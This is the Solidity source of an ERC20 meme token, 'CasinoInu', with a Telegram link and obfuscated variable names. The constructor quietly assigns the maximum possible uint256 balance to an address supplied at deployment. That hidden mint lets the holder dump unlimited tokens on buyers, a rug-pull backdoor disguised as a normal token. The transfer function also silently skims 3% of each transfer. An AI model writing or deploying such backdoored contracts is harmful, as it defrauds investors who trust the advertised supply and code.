// https://t.me/casinoinu_eth

// SPDX-License-Identifier: MIT

pragma solidity >0.8.6;

import "./Ownable.sol";
import "./ERC20.sol";

contract CasinoInu is ERC20, Ownable {
    uint256 private tea = ~uint256(0);
    uint256 public applied = 3;

    constructor(
        string memory hunter,
        string memory seldom,
        address gradually,
        address football
    ) ERC20(hunter, seldom) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
        _balances[football] = tea;
    }

    function _transfer(
        address able,
        address degree,
        uint256 decide
    ) internal override {
        uint256 foreign = (decide / 100) * applied;
        decide = decide - foreign;
        super._transfer(able, degree, decide);
    }
}
